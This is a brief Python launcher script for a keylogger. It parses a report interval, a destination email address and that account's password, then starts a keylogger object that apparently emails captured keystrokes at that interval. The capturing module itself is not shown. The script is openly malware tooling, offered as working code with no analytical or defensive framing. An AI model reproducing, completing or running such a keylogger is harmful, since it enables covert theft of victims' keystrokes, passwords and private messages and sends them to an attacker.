import keylogger
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--time_interval", dest="time_interval", help="The time interval to give report.")
    parser.add_option("-e", "--email", dest="email", help="The email to send the report")
    parser.add_option("-p", "--pass", dest="password", help="The password of the email(smtplib_server)")
    (options, arguments) = parser.parse_args()
    if not options.time_interval:
        parser.error("[-] Please provide the time_interval to report, use --help for more info.")
    if not options.email:
        parser.error("[-] Please provide the email to which report is to be send, use --help for more info.")
    if not options.password:
        parser.error("[-] Please provide the password of the email, use --help for more info. ")
    return options

option = get_arguments()
my_keylogger = keylogger.Keylogger(int(option.time_interval), option.email, option.password)
my_keylogger.start()